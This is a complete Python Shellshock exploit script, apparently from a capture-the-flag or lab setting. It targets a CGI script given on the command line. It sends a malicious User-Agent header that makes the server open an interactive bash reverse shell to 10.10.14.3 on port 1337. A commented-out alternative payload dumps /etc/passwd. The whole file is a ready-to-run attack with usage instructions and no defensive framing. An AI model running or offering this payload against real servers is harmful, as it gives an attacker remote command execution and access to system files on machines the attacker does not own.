import requests
import sys
import argparse
import textwrap
import time

parser = argparse.ArgumentParser(
    prog='SHOCKTHESHELL',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=textwrap.dedent('''\
                                SHELL SHOCK EXPLOIT
                ----------------------------------------------------
                The host and cgi directory must be passed as 
                an argument.
                -----------------------------------------------------
                
                Example:
 
                python3 shellshock.py http:<targetip>/cgi-bin/file.sh
                
                The file in the CGI-BIN directory may vary from one target to another.
                
                '''))

parser.add_argument("host", help="enter a domain or IP address")

args = parser.parse_args()



host = sys.argv[1]

print("[*]")
print("[*]")
print("[*] Make sure your listener is listening...")
print("[*] Incoming shell...")
time.sleep(5)
#headers = {'User-Agent': "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"}
headers = {'User-Agent': "() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/10.10.14.3/1337 0>&1'"}

response = requests.get(host, headers=headers)

#print(response.text)

